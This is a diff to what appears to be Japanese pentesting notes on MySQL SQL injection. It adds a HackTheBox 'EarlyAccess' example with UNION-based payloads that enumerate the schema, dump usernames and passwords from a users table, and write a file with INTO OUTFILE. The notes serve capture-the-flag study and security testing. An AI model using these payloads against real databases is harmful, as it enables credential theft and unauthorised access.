@@ -140,6 +140,19 @@
   * パスワード推定の場合、`$c`は16進数で使用する文字および$に限定可能である
     * `[a-f0-9$]`
 
-## Reference
+## Examples
+* Htb: EarlyAccess
+
+  ```sql
+  ') UNION SELECT  0,1,table_name  FROM INFORMATION_SCHEMA.TABLES;--
+  ') UNION SELECT  0,1,column_name  FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users';--
+  ') UNION SELECT  0,1,name  FROM users;--
+  ') UNION SELECT  0,1,password  FROM users;--
+  ') UNION SELECT  0,1,2  INTO OUTFILE '/tmp/test.txt';--
+  ```
+
+  
+
+## SQLI Reference
 ----
 * [mysql udf a penetration test](https://www.programmersought.com/article/84344091741/)
